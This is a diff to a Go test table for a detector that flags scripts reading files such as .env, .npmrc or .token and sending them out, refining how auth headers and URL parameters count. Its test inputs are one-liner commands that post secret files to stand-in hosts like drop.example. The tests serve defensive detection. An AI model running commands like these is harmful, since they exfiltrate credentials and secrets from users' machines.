@@ -452,9 +452,10 @@ func TestFileReadsScriptSends(t *testing.T) {
 		{`python3 -c "requests.post(url, json={}); print(open('.env').read())"`, []string{".env"}},
 		{`python3 -c "print(len(open('.env').read()))"`, []string{".env"}},
 		{`python3 -c "requests.post(url, data='open(\'.env\')')"`, nil},
-		{`python3 -c "requests.get(url, params={'k': open('.env').read()})"`, []string{".env"}},
+		{`python3 -c "requests.post(url, params={'k': open('.env').read()})"`, []string{"sent:.env"}},
 
 		{`node -e 'fetch("https://drop.example", {method: "POST", body: fs.readFileSync(".env")})'`, []string{"sent:.env"}},
+		{`node -e 'fetch("https://drop.example", {method: "POST", headers, body: fs.readFileSync(".env")})'`, []string{"sent:.env"}},
 		{`node -e 'https.request("https://drop.example", {method: "POST"}).end(fs.readFileSync(".env"))'`, []string{"sent:.env"}},
 		{"node <<'EOF'\nrequire('https').request(opts)\n  .end(fs.readFileSync('.npmrc'))\nEOF", []string{"sent:.npmrc"}},
 		{`node -e 'axios.post(url, fs.readFileSync(".env", "utf8"))'`, []string{"sent:.env"}},
@@ -495,8 +496,8 @@ func TestFileReadsScriptSends(t *testing.T) {
 		{`node -e 'const r = fs.createReadStream("out.log"); r.write(fs.readFileSync(".env"))'`, []string{"out.log", ".env"}},
 		{`php -r '$d = file_get_contents(".env"); echo $d;'`, []string{".env"}},
 
-		// A call's headers, credentials and URL parameters are not the data it sends, as for
-		// curl: a script that reads its API key from a file and calls the API sends no file.
+		// A call's credentials are not the data it sends: a script that reads its API key from a
+		// file and calls the API with it sends no file. Other headers and URL parameters are data.
 		{`python3 -c "k = open('.env').read().strip(); requests.post(url, headers={'Authorization': 'Bearer ' + k}, json={'q': 1})"`, []string{".env"}},
 		{`python3 -c "requests.post(url, auth=('me', open('.token').read()), data='x')"`, []string{".token"}},
 		{`python3 -c "k = open('.env').read(); requests.post(url, headers={'A': k}, data=k)"`, []string{"sent:.env"}},
@@ -504,6 +505,11 @@ func TestFileReadsScriptSends(t *testing.T) {
 		{`node -e 'const k = fs.readFileSync(".env", "utf8"); fetch(url, {method: "POST", headers: {Authorization: k}, body: "{}"})'`, []string{".env"}},
 		{`node -e 'const k = fs.readFileSync(".env", "utf8"); fetch(url, {headers: {A: "b", C: "d"}, body: k})'`, []string{"sent:.env"}},
 		{`php -r '$k = file_get_contents(".token"); curl_setopt($ch, CURLOPT_HTTPHEADER, array("Authorization: " . $k));'`, []string{".token"}},
+		{`python3 -c "requests.get(url, headers={'Authorization': 'Bearer ' + open('.token').read()})"`, []string{".token"}},
+		{`node -e 'fetch(url, {headers: {"X-Api-Key": fs.readFileSync(".token", "utf8")}})'`, []string{".token"}},
+		{`python3 -c "requests.post(url, headers={'X-D': open('.env').read()})"`, []string{"sent:.env"}},
+		{`php -r 'curl_setopt($ch, CURLOPT_URL, "https://x.example/?d=" . file_get_contents(".env"));'`, []string{"sent:.env"}},
+		{`python3 -c "requests.post(url, json={'token': open('.env').read()})"`, []string{"sent:.env"}},
 	})
 }
 
